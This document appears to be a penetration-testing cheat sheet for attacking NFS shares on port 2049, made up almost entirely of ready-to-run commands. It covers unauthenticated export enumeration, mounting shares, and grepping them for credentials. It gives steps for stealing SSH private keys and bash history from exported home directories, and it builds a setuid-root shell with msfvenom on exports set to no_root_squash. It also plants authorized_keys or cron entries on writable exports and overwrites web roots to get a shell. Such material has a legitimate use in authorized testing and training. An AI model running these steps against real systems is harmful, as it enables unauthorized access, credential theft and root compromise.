# NFS

### Port: 2049

## Service Usage

List exports (no auth needed, most important command)
```bash
showmount -e $ip
```
Mount an export
```bash
mount -t nfs $ip:/export/path /mnt/nfs
```
Mount with nolock option (avoids lock errors)
```bash
mount -t nfs -o nolock $ip:/export/path /mnt/nfs
```
Unmount
```bash
umount /mnt/nfs
```

## 0. Fast Path (try these first)

List shares instantly
```bash
showmount -e $ip
```
Mount root if world-exported, then list contents
```bash
mount -t nfs -o nolock $ip:/ /mnt/nfs
```
List the mounted contents
```bash
ls -la /mnt/nfs
```

## 1. Banner Grab & Unauthenticated Enumeration

Port and export enumeration
```bash
nmap -p 111,2049 -sV -sC $ip
```
List NFS exports
```bash
showmount -e $ip
```
Query RPC services on the host
```bash
rpcinfo -p $ip
```
NFS-specific NSE scripts
```bash
nmap -p 2049 --script nfs-ls,nfs-showmount,nfs-statfs $ip
```

## 2. Authenticated Enumeration

NFS usually has no per-user auth — the exports are the boundary. "Auth" = what you can read/write once mounted.
Mount a specific export
```bash
mount -t nfs -o nolock $ip:/path /mnt/nfs
```
Find files matching sensitive keywords
```bash
find /mnt/nfs -type f 2>/dev/null | grep -iE 'pass|key|cred|config|ssh'
```
List all files recursively
```bash
ls -laR /mnt/nfs
```

## 3. Password Spraying / Bruteforcing

N/A for NFS itself — no password auth. Skip this section.

## 5. Quick Wins

### 5.1 Read everything — SSH keys often live in exported /home
```bash
mount -t nfs $ip:/home /mnt/nfs
cat /mnt/nfs/*/.ssh/id_rsa        # → then ssh -i
cat /mnt/nfs/*/.bash_history
```

### 5.2 no_root_squash → write a setuid binary as root
```bash
# If the export has no_root_squash, write a setuid-root shell, chmod +s as root, run on target
msfvenom -p linux/x86/exec CMD="/bin/sh" -f elf -o /mnt/nfs/pwn
chmod +s /mnt/nfs/pwn
# execute on target: /mnt/nfs/pwn
```
*(msfvenom here is only a payload generator, not a framework — commonly accepted. If your policy bars it, write a C setuid shell instead.)*

### 5.3 World-writable export → overwrite a config/script that root runs
```bash
ls -la /mnt/nfs        # find world-writable, then plant authorized_keys, cron, etc.
```

## 6. Config Paths

NFS exports
```text
/etc/exports
/etc/fstab
```

Config quick-reference:
```text
/etc/exports -> look for: rw, no_root_squash, no_all_squash, *(everyone)
```

## 7. Post-Exploit / Pivot

- Read SSH keys → ssh as that user
- no_root_squash → root setuid → full compromise
- Overwrite web root → shell via HTTP

### Common gotchas
```text
- "no_root_squash" = your root maps to target root (write setuid binaries).
- Mount fails? Use -o nolock, and make sure rpcbind (111) is reachable too.
- Read-only exports still leak creds/configs — don't skip them.
- NFS over UDP may need -o udp on old targets.
```